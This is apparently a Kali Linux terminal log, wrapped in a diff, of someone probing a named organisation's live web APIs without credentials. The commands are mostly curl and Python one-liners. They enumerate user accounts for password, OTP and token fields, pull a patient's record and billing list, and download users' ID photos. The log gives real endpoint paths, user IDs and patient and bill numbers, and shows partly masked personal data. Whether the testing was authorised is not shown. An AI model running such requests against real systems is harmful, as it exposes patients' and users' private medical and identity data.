@@ -1,0 +1,93 @@
+┌──(kalics㉿kalics)-[~]
+└─$ cd ~/narayana-audit && echo "=== A. IS Password POPULATED ANYWHERE? ===" && for i in 3334024 45605236 45604917 45604916 ; do echo -n "   User/Info/$i -> " ; curl -k -s -m 30 "https://narayanagroup.co.in/NtraktApi/api/User/Info/$i" -o /tmp/u.json ; python3 -c "
+import json
+d=json.load(open('/tmp/u.json'))['data']
+r=d[0] if isinstance(d,list) and d else d
+sec=[k for k in r.keys() if any(t in k.lower() for t in ['pass','pwd','pin','otp','token','secret','aadhar'])]
+print('security-ish fields:', ', '.join(sec) if sec else 'none')
+for k in sec:
+    v=r.get(k)
+    print('       %-16s %s' % (k, 'EMPTY' if v in (None,'','0') else 'POPULATED len=%d' % len(str(v))))
+" ; done ; echo -e "\n=== B. PROVE THE CHAIN: Prno -> NAME -> INVESTIGATIONS ===" && P=20211103705 ; echo "   --- Patient/Info/$P ---" ; curl -k -s -m 30 "https://narayanagroup.co.in/NnoteApi/api/Patient/Info/$P" -o /tmp/pi.json ; python3 -c "
+import json
+d=json.load(open('/tmp/pi.json'))['data']
+if not d: print('     no record'); raise SystemExit
+r=d[0]
+for k,v in r.items():
+    if v is None or str(v).strip() in ('','0'): continue
+    s=str(v); lk=k.lower()
+    if any(t in lk for t in ['name','mobile','phone','aadhar']): s=s[:4]+'#'*max(0,len(s)-4)+'  [%d]'%len(s)
+    print('     %-22s %s'%(k,s[:70]))
+" ; echo -e "\n=== C. SCALE OF THE CHAIN ===" && curl -k -s -m 30 "https://narayanagroup.co.in/NnoteApi/api/Investigation/Cancel/Approval/List" -o /tmp/ic.json && python3 -c "
+import json
+d=json.load(open('/tmp/ic.json'))['data']
+pr=[r for r in d if '2026' in str(r.get('BillDate'))]
+print('   2026 records:',len(pr),'| distinct Prno:',len(set(r.get('Prno') for r in pr)))
+print('   sample Prno/OldBill/Bill triples:')
+for r in pr[:4]: print('    ',r.get('Prno'), r.get('OldBillNo'), r.get('BillNo'))
+" ; rm -f /tmp/u.json /tmp/pi.json /tmp/ic.json
+=== A. IS Password POPULATED ANYWHERE? ===
+   User/Info/3334024 -> security-ish fields: Password, OTP, OTPMessage
+       Password         EMPTY
+       OTP              EMPTY
+       OTPMessage       EMPTY
+   User/Info/45605236 -> security-ish fields: Password, OTP, OTPMessage
+       Password         EMPTY
+       OTP              EMPTY
+       OTPMessage       EMPTY
+   User/Info/45604917 -> security-ish fields: Password, OTP, OTPMessage
+       Password         EMPTY
+       OTP              EMPTY
+       OTPMessage       EMPTY
+   User/Info/45604916 -> security-ish fields: Password, OTP, OTPMessage
+       Password         EMPTY
+       OTP              EMPTY
+       OTPMessage       EMPTY
+
+=== B. PROVE THE CHAIN: Prno -> NAME -> INVESTIGATIONS ===
+   --- Patient/Info/20211103705 ---
+     Regno                  20211103705
+     Name                   PRAS#######  [11]
+     Age                    55
+     AgeType                Y
+     Gender                 M
+     MobileNo               9491######  [10]
+     OrganisationCode       ARM
+
+=== C. SCALE OF THE CHAIN ===
+   2026 records: 38 | distinct Prno: 34
+   sample Prno/OldBill/Bill triples:
+     20211103705 202601100509 202601100002
+     20251259069 202601230745 202601240003
+     20260209351 202602060227 202602060005
+     1005466714 202602111012 202602120004
+                                                                                                                                                                                                                                            
+┌──(kalics㉿kalics)-[~/narayana-audit]
+└─$ cd ~/narayana-audit && mkdir -p photos && cd photos && curl -k -s -m 20 -o 00_placeholder.png "https://narayanagroup.co.in/NtraktApi/api/StudentAvailability/1" && curl -k -s -m 20 -o 01_showpicture_3334024.bin "https://narayanagroup.co.in/NtraktApi/api/User/ShowPicture/3334024" && curl -k -s -m 20 -o 02_showpicture_45605236.jpg "https://narayanagroup.co.in/NtraktApi/api/User/ShowPicture/45605236" && curl -k -s -m 20 -o 03_showpicture_45604917.jpg "https://narayanagroup.co.in/NtraktApi/api/User/ShowPicture/45604917" && curl -k -s -m 20 -o 04_showpicture_45604916.jpg "https://narayanagroup.co.in/NtraktApi/api/User/ShowPicture/45604916" && file * && echo -e "\n=== HASHES — identical hash means identical image ===" && md5sum * && echo -e "\n=== VIEW ===" && (xdg-open 02_showpicture_45605236.jpg 2>/dev/null && echo "opened in viewer") || echo "open manually: $(pwd)/02_showpicture_45605236.jpg" ; ls -la
+00_placeholder.png:          PNG image data, 220 x 220, 8-bit/color RGB, non-interlaced
+01_showpicture_3334024.bin:  PNG image data, 220 x 220, 8-bit/color RGB, non-interlaced
+02_showpicture_45605236.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 150x150, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=8, manufacturer=Canon, model=CanoScan LiDE 120, orientation=upper-left, software=IJ Scan Utility, datetime=2024/01/22 18:26:27], baseline, precision 8, 190x255, components 3
+03_showpicture_45604917.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=12], baseline, precision 8, 411x526, components 3
+04_showpicture_45604916.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 300x300, segment length 16, Exif Standard: [TIFF image data, big-endian, direntries=12], baseline, precision 8, 410x527, components 3
+
+=== HASHES — identical hash means identical image ===
+cac0548b3c83a8ff9fd292d6da1b21f1  00_placeholder.png
+cac0548b3c83a8ff9fd292d6da1b21f1  01_showpicture_3334024.bin
+3ebbe43690fa9c325fa50e23abb15f99  02_showpicture_45605236.jpg
+a545766927ff2d2b628e95f14f30637d  03_showpicture_45604917.jpg
+5f802a23ef5c240823c9f189831806cc  04_showpicture_45604916.jpg
+
+=== VIEW ===
+opened in viewer
+total 180
+drwxrwxr-x 2 kalics kalics  4096 Oct 12 02:59 .
+drwxrwxr-x 3 kalics kalics  4096 Oct 12 02:59 ..
+-rw-rw-r-- 1 kalics kalics  7155 Oct 12 05:18 00_placeholder.png
+-rw-rw-r-- 1 kalics kalics  7155 Oct 12 05:18 01_showpicture_3334024.bin
+-rw-rw-r-- 1 kalics kalics 13626 Oct 12 05:18 02_showpicture_45605236.jpg
+-rw-rw-r-- 1 kalics kalics 76879 Oct 12 05:18 03_showpicture_45604917.jpg
+-rw-rw-r-- 1 kalics kalics 63915 Oct 12 05:18 04_showpicture_45604916.jpg
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
+┌──(kalics㉿kalics)-[~/narayana-audit/photos]
+└─$ 
+
